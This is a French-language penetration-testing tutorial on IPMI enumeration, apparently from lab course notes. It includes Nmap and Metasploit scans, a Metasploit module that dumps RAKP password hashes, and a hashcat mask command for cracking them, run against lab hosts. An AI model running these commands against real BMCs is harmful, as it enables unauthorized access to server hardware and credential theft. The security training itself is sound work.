# Enumération des services

## IPMI

L'interface de gestion de plate-forme intelligente (IPMI) est un ensemble de spécifications normalisées pour les systèmes de gestion d'hôte basés sur le matériel utilisés pour la gestion et la surveillance du système. Il agit comme un sous-système autonome et fonctionne indépendamment du BIOS, du processeur, du micrologiciel et du système d'exploitation sous-jacent de l'hôte. IPMI offre aux administrateurs système la possibilité de gérer et de surveiller les systèmes même s'ils sont éteints ou dans un état qui ne répond pas. Il fonctionne à l'aide d'une connexion réseau directe au matériel du système et ne nécessite pas d'accès au système d'exploitation via un shell de connexion. IPMI peut également être utilisé pour les mises à niveau à distance des systèmes sans nécessiter d'accès physique à l'hôte cible. IPMI est généralement utilisé de trois manières:

+ Avant le démarrage du système d'exploitation pour modifier les paramètres du BIOS
+ Lorsque l'hôte est complètement éteint
+ Accès à un hôte après une panne du système

Lorsqu'il n'est pas utilisé pour ces tâches, IPMI peut surveiller une gamme de choses différentes telles que la température du système, la tension, l'état du ventilateur et les alimentations. Il peut également être utilisé pour interroger les informations d'inventaire, consulter les journaux du matériel et alerter à l'aide de SNMP. Le système hôte peut être mis hors tension, mais le module IPMI nécessite une source d'alimentation et une connexion LAN pour fonctionner correctement.

Le protocole IPMI a été publié pour la première fois par Intel en 1998 et est désormais pris en charge par plus de 200 fournisseurs de systèmes, dont Cisco, Dell, HP, Supermicro, Intel, etc. Les systèmes utilisant IPMI version 2.0 peuvent être administrés via série sur LAN, ce qui donne aux administrateurs système la possibilité de visualiser la sortie de la console série dans la bande. Pour fonctionner, IPMI nécessite les composants suivants:

+ Contrôleur de gestion de la carte de base (BMC) - Un microcontrôleur et un composant essentiel d'un IPMI
+ Intelligent Chassis Management Bus (ICMB) - Une interface qui permet la communication d'un châssis à un autre
+ Intelligent Platform Management Bus (IPMB) - étend le BMC
+ Mémoire IPMI - stocke des éléments tels que le journal des événements système, les données de stockage du référentiel, etc.
+ Interfaces de communication - interfaces système locales, interfaces série et LAN, bus de gestion ICMB et PCI

### Empreinte du service
IPMI communique sur le port 623 UDP. Les systèmes qui utilisent le protocole IPMI sont appelés Baseboard Management Controllers (BMC). Les BMC sont généralement implémentés en tant que systèmes ARM embarqués exécutant Linux et connectés directement à la carte mère de l'hôte. Les BMC sont intégrés à de nombreuses cartes mères, mais peuvent également être ajoutés à un système en tant que carte PCI. La plupart des serveurs sont livrés avec un BMC ou prennent en charge l'ajout d'un BMC. Les BMC les plus courants que nous voyons souvent lors des tests de pénétration internes sont HP iLO, Dell DRAC et Supermicro IPMI. Si nous pouvions accéder à un BMC lors d'une évaluation, nous obtiendrions un accès complet à la carte mère hôte et pourrions surveiller, redémarrer, éteindre ou même réinstaller le système d'exploitation hôte. L'accès à un BMC équivaut presque à un accès physique à un système. De nombreux BMC (y compris HP iLO, Dell DRAC et Supermicro IPMI) exposent une console de gestion basée sur le Web, une sorte de protocole d'accès à distance en ligne de commande tel que Telnet ou SSH, et le port 623 UDP, qui, encore une fois, est pour le Protocole réseau IPMI. Vous trouverez ci-dessous un exemple d'analyse Nmap utilisant le script Nmap ipmi-version NSE pour effectuer l'empreinte du service.

#### Scan Nnmap
```
dsgsec@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

#### Metasploit Version Scan
```
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Paramètres dangereux
Si les informations d'identification par défaut ne fonctionnent pas pour accéder à un BMC, nous pouvons nous tourner vers une faille du protocole RAKP dans IPMI 2.0. Pendant le processus d'authentification, le serveur envoie un hachage SHA1 ou MD5 salé du mot de passe de l'utilisateur au client avant que l'authentification n'ait lieu. Cela peut être exploité pour obtenir le hachage du mot de passe pour TOUT compte utilisateur valide sur le BMC. Ces hachages de mot de passe peuvent ensuite être déchiffrés hors ligne à l'aide d'une attaque par dictionnaire utilisant le mode Hashcat 7300. Dans le cas où un HP iLO utilise un mot de passe par défaut, nous pouvons utiliser cette commande d'attaque de masque Hashcat 
```
hashcat -m 7300 ipmi.txt -a 3 ?1 ?1?1?1?1?1?1?1 -1 ?d?u
```
qui essaie toutes les combinaisons de lettres majuscules et de chiffres pour un mot de passe à huit caractères.

Il n'y a pas de "résolution" directe à ce problème car la faille est un composant critique de la spécification IPMI. Les clients peuvent opter pour des mots de passe très longs et difficiles à déchiffrer ou implémenter des règles de segmentation du réseau pour restreindre l'accès direct aux BMC. Il est important de ne pas négliger IPMI lors des tests d'intrusion internes (nous le voyons lors de la plupart des évaluations) car non seulement nous pouvons souvent accéder à la console Web BMC, ce qui est une découverte à haut risque, mais nous avons vu des environnements où un unique ( mais craquable) un mot de passe est défini qui est ensuite réutilisé sur d'autres systèmes. Lors d'un de ces tests de pénétration, nous avons obtenu un hachage IPMI, l'avons craqué hors ligne à l'aide de Hashcat, et avons pu accéder en SSH à de nombreux serveurs critiques de l'environnement en tant qu'utilisateur root et accéder aux consoles de gestion Web pour divers outils de surveillance du réseau.

Pour récupérer les hachages IPMI, nous pouvons utiliser le module Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval.

#### Metasploit Dumping Hashes
```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ici, nous pouvons voir que nous avons réussi à obtenir le hachage du mot de passe pour l'utilisateur ADMIN, et l'outil a pu le déchiffrer rapidement pour révéler ce qui semble être un mot de passe par défaut ADMIN. À partir de là, nous pourrions tenter de nous connecter au BMC ou, si le mot de passe était quelque chose de plus unique, vérifier la réutilisation du mot de passe sur d'autres systèmes. IPMI est très courant dans les environnements réseau, car les administrateurs système doivent pouvoir accéder aux serveurs à distance en cas de panne ou effectuer certaines tâches de maintenance qu'ils auraient traditionnellement dû être physiquement devant le serveur pour effectuer. Cette facilité d'administration s'accompagne du risque d'exposer les hachages de mot de passe à quiconque sur le réseau et peut entraîner un accès non autorisé, une interruption du système et même l'exécution de code à distance. La vérification de l'IPMI devrait faire partie de notre manuel de test d'intrusion interne pour tout environnement que nous évaluons.
